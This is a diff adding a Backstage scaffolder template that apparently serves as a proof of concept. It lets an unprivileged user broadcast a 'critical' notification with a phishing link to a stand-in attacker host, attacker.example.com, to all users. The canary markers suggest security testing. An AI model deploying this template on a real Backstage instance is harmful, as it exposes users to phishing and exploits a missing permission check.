@@ -1,0 +1,21 @@
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: nova39-notif-phishing
+  namespace: default
+  title: NOVA39 Notification Test
+  description: Test template
+spec:
+  owner: user:guest
+  type: test
+  parameters: []
+  steps:
+    - id: send
+      name: Send Notification
+      action: notification:send
+      input:
+        recipients: broadcast
+        title: "NOVA39_CANARY: sent by unprivileged user"
+        info: "Sent via notification:send scaffolder action by any authenticated user - no service credentials needed"
+        link: "https://attacker.example.com/phishing"
+        severity: critical
